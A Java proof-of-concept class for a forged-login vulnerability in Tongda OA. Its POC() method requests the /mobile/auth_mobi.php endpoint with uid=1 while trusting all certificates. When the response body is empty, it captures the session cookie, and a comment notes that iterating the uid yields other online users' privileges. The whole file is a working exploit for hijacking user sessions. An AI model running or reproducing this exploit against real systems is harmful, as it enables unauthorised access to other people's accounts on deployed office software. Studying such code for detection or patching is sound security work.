package poc;

import com.github.kevinsawicki.http.HttpRequest;

import java.net.HttpCookie;

public class TongdaOA_AuthmobiLogin {
    private String url;//通达OAurl
    private String path;//漏洞目录
    private String cookie;//cookie

    public String getUrl() {
        return url;
    }

    public void setUrl(String url) {
        this.url = url;
    }

    public String getPath() {
        return path;
    }

    public void setPath(String path) {
        this.path = path;
    }

    public String getCookie() {
        return cookie;
    }

    public void setCookie(String cookie) {
        this.cookie = cookie;
    }

    //通达OA伪造在线用户登录漏洞POC
    public boolean POC(){
        //漏洞目录地址,可遍历uid获取其他在线用户权限
        path="/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0";
        HttpRequest cookieRequest = HttpRequest.get(url + path)
                .trustAllCerts()
                .trustAllHosts();
        if (cookieRequest.body().isEmpty()) {
            cookie=cookieRequest.header("Set-cookie");
            return true;
        }else {
            return false;
        }
    }
}
